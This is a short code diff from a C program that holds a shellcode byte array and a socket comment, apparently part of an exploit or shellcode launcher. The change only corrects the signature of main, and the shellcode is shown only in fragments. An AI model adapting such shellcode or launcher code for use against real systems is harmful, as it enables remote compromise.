@@ -26,7 +26,7 @@ char * sc[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
 "\x05";
 int sclen = sizeof(sc) -1;
 
-int main(char ** argv[], int * argc)  
+int main(char * argv[], int * argc)  
 {
     char p[SIZE];
     // our socket
